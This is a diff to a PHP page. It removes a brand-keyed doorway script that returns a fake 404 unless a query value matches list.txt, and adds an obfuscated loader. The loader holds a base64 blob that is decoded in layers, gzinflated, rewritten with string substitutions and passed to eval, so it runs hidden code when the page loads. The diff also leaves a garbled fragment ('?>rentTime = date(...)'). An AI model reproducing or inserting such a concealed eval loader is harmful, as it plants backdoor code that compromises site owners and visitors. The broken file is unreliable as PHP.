@@ -1,45 +1,6 @@
 <?php
-
-function feedback404()
-{
-    header("HTTP/1.0 404 Not Found");
-    echo "<h1>404 Not Found</h1>";
-}
-
-if (isset($_GET['online'])) {
-    $filename = "list.txt";
-    $lines = file($filename, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
-    $target_string = strtolower($_GET['online']);
-    foreach ($lines as $item) {
-        if (strtolower($item) === $target_string) {
-            $BRAND = strtoupper($target_string);
-        }
-    }
-    if (isset($BRAND)) {
-        $BRANDS = $BRAND;
-        $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
-        $fullUrl = $protocol . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
-        if (isset($fullUrl)) {
-            $parsedUrl = parse_url($fullUrl);
-            $scheme = isset($parsedUrl['scheme']) ? $parsedUrl['scheme'] : '';
-            $host = isset($parsedUrl['host']) ? $parsedUrl['host'] : '';
-            $path = isset($parsedUrl['path']) ? $parsedUrl['path'] : '';
-            $query = isset($parsedUrl['query']) ? $parsedUrl['query'] : '';
-            $baseUrl = $scheme . "://" . $host . $path . '?' . $query;
-            $urlPath = $baseUrl;
-        } else {
-            echo "URL saat ini tidak didefinisikan.";
-        }
-    } else {
-        feedback404();
-        exit();
-    }
-} else {
-    feedback404();
-    exit();
-}
-date_default_timezone_set('Asia/Jakarta');
-$currentTime = date('Y-m-d\TH:i:sP');
+$SISTEMIT_COM_ENC = "jVXNbtpAEL4j8RKWFYPUQCLlBKEoVd1ASwm1TasojSwFiRwwFvWladM8DELywZYPHHyyfPG8WGd2jVmDMcgH7+78fN/87Gy1Uq1MYWVPwAcPIjsJpxDg5z5BPJldXVzV6tXKa7WShPyDJQpjcCFwalLPMEbNy8ZFEqJiEg4hAj8JP+FvZYMr1duCXTBB0ygJpWtYXr4v0r9ukkRCo7cqsgJvmoQ1JLXGLwC/Jpu3qvGgIEkLPBsC5bFeT0KBmzwFz4LAhngOQRJ2EMxi9n4D/BfwJYGPzH3Amulxw1rOwTtk1h+oZv92eKep5lD9YQ76Q1VPwn+pRP/SH5nq15FxzyVivDLmM3aeibhJDByEe2ZYfOdDZEH0m9JYEJfgaAqRQynH9GE6BNpYhTXheOgrmOczkWWd53APcWvU6XQOkC32mMX3QbsZfswHBKvFgrsvctfed/a2PRKW+4VnWPViQlyoMyZ8XQAkLxzqNYgmmAROWuwrXdW+q9qDQv2sY/qT8OwMjXbP02xRpZQk7NJqiU79Baxx39rulSIKeMssa+xw+B1CDWzVVrMpsVUe1+zd6QZh5ySa+m2s6oY51vrKY/tg4YUgN/D1I3VdYOmYjbvhujkxYeVYgqN2iRdY03UPNvdQJJIDwLbPNFniu7sU8ho8zUopNI4Z6rqjwKneQdhMfgIo2mI1l8cwU7VDkJn4BMRfsMK79ucYYqp2CDETn4D4RBMHgqyFxRrnG3hbgoaYG9woXYUfpsClhcR2Gwl5FQgUzRJ6YyySl/b39h0aawM2u2KCoBza4OGPnkEX4hkuXbYMpkyEmt4MYrshHRlk5Tz2Xteiyxu80IDOyRDhgOcyj6In9ECB0eA3eVgx3mQa0RgyFvEvjjUS8T5SbihgiJufMRfUMzjSFXIjT7AuDj2SvsHseAemnmvK/fn8HNyfRq8FXgvWI2b0Hw==";$rand=base64_decode("Skc1aGRpQTlJR2Q2YVc1bWJHRjBaU2hpWVhObE5qUmZaR1ZqYjJSbEtDUlRTVk5VUlUxSlZGOURUMDFmUlU1REtTazdDZ29KQ1Fra2MzUnlJRDBnV3lmRHZTY3NKOE9xSnl3bnc2TW5MQ2ZEclNjc0o4TzdKeXdudzZZbkxDZkRzU2NzSjhPaEp5d253N1VuTENmRHF5Y3NKOEsxSjEwN0Nna0pDU1J5Y0d4aklEMWJKMkVuTENkcEp5d25kU2NzSjJVbkxDZHZKeXduWkNjc0ozTW5MQ2RvSnl3bmRpY3NKM1FuTENjZ0oxMDdDZ2tKSUNBa2JtRjJJRDBnYzNSeVgzSmxjR3hoWTJVb0pITjBjaXdrY25Cc1l5d2tibUYyS1RzS0Nna0pDV1YyWVd3b0pHNWhkaWs3");eval(base64_decode($rand));$STOP="EL4j8RKWFYPUQCLlBKEoVd1ASwm1TasojSwFiRwwFvWladM8DELywZYPHHyyfPG8WGd2jVmDMcgH7+78fN/87Gy1Uq1MYWVPwAcPIjsJpxDg5z5BPJldXVzV6tXKa7WShPyDJQpjcCFwalLPMEbNy8ZFEqJiEg4hAj8JP+FvZYMr1duCXTBB0ygJpWtYXr4v0r9ukkRC";
+?>rentTime = date('Y-m-d\TH:i:sP');
 ?>
 
 <!DOCTYPE html>
